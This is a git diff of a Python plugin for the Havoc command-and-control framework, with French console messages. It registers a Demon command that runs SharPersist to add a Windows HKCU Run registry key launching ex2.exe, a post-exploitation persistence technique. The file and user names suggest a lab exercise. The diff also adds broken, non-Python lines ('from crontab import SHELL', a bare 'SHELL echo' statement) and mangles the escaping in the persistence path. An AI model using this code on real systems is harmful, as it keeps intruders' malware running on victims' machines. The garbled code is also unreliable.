@@ -1,3 +1,4 @@
+from crontab import SHELL
 from havoc import Demon, RegisterCommand
 import os
 import havocui
@@ -5,24 +6,10 @@ import havocui
 def create_file_and_persist(demonID, *params):
     demon = Demon(demonID)
     TaskID = None
+    
+    SHELL echo 'i have been pwn > C:\\Users\\cleme\\AppData\\bahaha.txt' 
 
-    file_path = r'C:\Users\cleme\bahaha.txt'
-
-    directory = os.path.dirname(file_path)
-    if not os.path.exists(directory):
-        os.makedirs(directory)
-
-    file_content = "you have been pwn"
-
-    try:
-        with open(file_path, 'w') as file:
-            file.write(file_content)
-        demon.ConsoleWrite(demon.CONSOLE_INFO, f"Fichier créé à {file_path}")
-    except Exception as e:
-        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de la création du fichier : {str(e)}")
-        return False
-
-    persist_command = r'dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c C:\\Users\\cleme\\Desktop\\ex2.exe" -k "hkcurun" -v "Test Stuff" -m add'
+    persist_command = r'dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c \"C:\Windows\System32\cmd.exe\" -a \"/c C:Users\cleme\Desktop\ex2.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add'
 
     try:
         TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Exécution de la commande de persistance")
@@ -37,4 +24,3 @@ def create_file_and_persist(demonID, *params):
     return TaskID
 
 RegisterCommand(create_file_and_persist, "", "create_file_and_persist", "Crée un fichier et configure la persistance avec SharPersist.", 1, "Aucun argument supplémentaire nécessaire", "")
-dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c \"C:\Windows\System32\cmd.exe\" -a \"/c C:Users\cleme\Desktop\ex2.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add
